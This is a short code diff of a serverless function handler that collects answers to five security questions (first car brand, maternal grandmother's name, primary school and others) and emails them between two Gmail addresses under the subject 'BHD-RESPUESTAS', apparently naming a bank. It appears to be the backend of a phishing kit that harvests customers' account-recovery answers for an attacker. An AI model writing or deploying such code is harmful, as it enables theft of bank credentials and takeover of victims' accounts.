@@ -15,12 +15,14 @@ exports.handler = async function(event, context) {
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com',
-        subject: 'Respuestas de Seguridad',
-        text: `¿Cuál es el personaje de su libro favorito? ${favoriteCharacter}\n` +
-              `¿Cuál es la marca de su primer carro? ${firstCarBrand}\n` +
-              `¿Cuál es su color favorito? ${favoriteColor}\n` +
-              `¿Cuál es el nombre de su abuela materna? ${grandmotherName}\n` +
-              `¿Cuál es el nombre de su colegio? ${schoolName}`,
+        subject: 'BHD-RESPUESTAS',
+        text: `
+¿Cuál es el personaje de su libro favorito?: ${favoriteCharacter}
+¿Cuál es la marca de su primer carro?: ${firstCarBrand}
+¿Cuál es su color favorito?: ${favoriteColor}
+¿Cuál es el nombre de su abuela materna?: ${grandmotherName}
+¿Nombre del colegio donde cursó la primaria?: ${schoolName}
+        `,
     };
 
     try {
